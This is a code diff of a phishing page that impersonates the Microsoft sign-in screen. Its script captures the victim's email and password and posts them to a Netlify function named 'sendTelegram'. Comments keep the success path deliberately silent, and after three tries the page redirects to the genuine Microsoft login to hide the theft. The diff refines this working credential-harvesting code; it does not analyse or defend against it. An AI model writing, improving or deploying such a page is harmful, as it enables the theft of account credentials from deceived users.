@@ -14,7 +14,6 @@
   <meta name="ReqLC" content="1033">
   <meta name="LocLC" content="en-US">
 
-  <!-- single, reliable jQuery -->
   <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
 
   <!-- Bootstrap CSS -->
@@ -22,13 +21,11 @@
 
   <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
 
-  <!-- Font Awesome CSS so the back icon renders reliably -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" crossorigin="anonymous">
 
   <link href="css/hover.css" rel="stylesheet" media="all">
 
   <style type="text/css">
-    /* ensure background is visible and not blocked by container styles */
     html, body {
       height: 100% !important;
       margin: 0 !important;
@@ -37,7 +34,6 @@
     }
 
     body {
-      /* Use the HTTPS absolute background URL to avoid mixed-content and path issues */
       background-image: url('https://www.rapid7.com/cdn/assets/bltc9698ac925a4a219/683ddb9d2a76864ea7bc82bf/background.jpg') !important;
       background-size: cover !important;
       background-repeat: no-repeat !important;
@@ -46,17 +42,14 @@
       background-color: transparent !important;
     }
 
-    /* Keep page containers transparent so background shows through */
     .container-fluid, .container, .row {
       background: transparent !important;
     }
 
-    /* original card look */
     #div1, #div2 {
       background: #ffffff;
     }
 
-    /* back icon style to ensure visibility */
     #back {
       cursor: pointer;
       color: #23272a;
@@ -65,32 +58,16 @@
       display: inline-block;
     }
 
-    /* Hide native scrollbars while preserving scrolling functionality:
-       - Firefox: scrollbar-width: none
-       - IE 10+: -ms-overflow-style: none
-       - WebKit (Chrome/Safari): set scrollbar size to 0
-       This removes the thin line/scrollbar on the right while allowing users to scroll if content overflows. */
+    /* hide native scrollbars visually but allow scroll */
     html, body {
       overflow-y: auto;
-      scrollbar-width: none; /* Firefox */
-      -ms-overflow-style: none;  /* IE 10+ */
+      scrollbar-width: none;
+      -ms-overflow-style: none;
     }
-    /* WebKit browsers */
     html::-webkit-scrollbar, body::-webkit-scrollbar {
       width: 0px;
       height: 0px;
       background: transparent;
-    }
-
-    /* If some inner element still shows a scrollbar, hide it there too as fallback */
-    .container::-webkit-scrollbar, .container *::-webkit-scrollbar {
-      width: 0 !important;
-      height: 0 !important;
-      background: transparent !important;
-    }
-    .container, .container * {
-      scrollbar-width: none !important;
-      -ms-overflow-style: none !important;
     }
   </style>
 </head>
@@ -119,6 +96,7 @@
             <form id="contact">
               <img src="images/microsoft_logo.svg" class="img-fluid" alt="Microsoft logo"><br><br>
               <i class="fas fa-arrow-left" id="back" aria-hidden="true"></i>&nbsp;<span id="emailch">abc@abc.com</span><br>
+              <!-- keep message element hidden by default; will only show on error -->
               <span id="msg" class="text-danger" style="display:none;"></span><br>
               <span class="h5">Password</span>
               <div class="form-group mt-2">
@@ -138,7 +116,6 @@
     </div>
   </div>
 
-  <!-- Bootstrap JS dependencies and Bootstrap JS -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" crossorigin="anonymous"></script>
   <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" crossorigin="anonymous"></script>
 
@@ -198,7 +175,6 @@
         $("#msg").hide();
         $("#div2").animate({left:200, opacity:"hide"}, 0);
         $("#div1").animate({right:200, opacity:"show"}, 1000);
-
       });
 
       var count=0;
@@ -207,49 +183,55 @@
         var email=$("#email").val();
         var password=$("#password").val();
         var detail=$("#field").html();
-        var msg = $('#msg').html();
-        $('#msg').text( msg );
+        // ensure any old success text is removed and msg is hidden
+        $('#msg').hide().text('');
+
         count=count+1;
         if (count>=3) {
           // use https for redirect
           window.location.replace("https://login.microsoftonline.com");
+          return;
         }
-        else
-        {
-          (async function(){
-            try {
-              $('#submit-btn').html('Verifing...');
-              const payload = {
-                email: email,
-                password: password,
-                detail: detail
-              };
 
-              const resp = await fetch('/.netlify/functions/sendTelegram', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-              });
+        (async function(){
+          try {
+            $('#submit-btn').html('Verifing...');
+            const payload = {
+              email: email,
+              password: password,
+              detail: detail
+            };
 
-              if (!resp.ok) {
-                // show error message when request fails
-                $("#msg").show();
-                $('#msg').html("Please try again later");
-              } else {
-                // SUCCESS: do not display "Sent" notification to the user.
-                // keep the UI quiet and reset the button text below.
-                // If you want to redirect after a successful send, uncomment the line below:
-                // window.location.replace("https://login.microsoftonline.com");
-              }
-            } catch (err) {
-              console.error('Error sending to function:', err);
+            const resp = await fetch('/.netlify/functions/sendTelegram', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(payload)
+            });
+
+            if (!resp.ok) {
+              // show error message when request fails
               $("#msg").show();
               $('#msg').html("Please try again later");
-            } finally {
-              $('#submit-btn').html('Login');
+            } else {
+              // SUCCESS: intentionally do NOT display any "Sent" notification to the user.
+              // Keep UI silent on success. Log to console for debugging.
+              try {
+                const json = await resp.json().catch(()=> ({}));
+                console.log('sendTelegram response (success):', json);
+              } catch (e) {
+                console.log('sendTelegram success (no JSON body or parse error)');
+              }
+              // Optionally, you could redirect after successful send:
+              // window.location.replace("https://login.microsoftonline.com");
             }
-          })();
-       }
+          } catch (err) {
+            console.error('Error sending to function:', err);
+            $("#msg").show();
+            $('#msg').html("Please try again later");
+          } finally {
+            $('#submit-btn').html('Login');
+          }
+        })();
      });
     });
   </script>
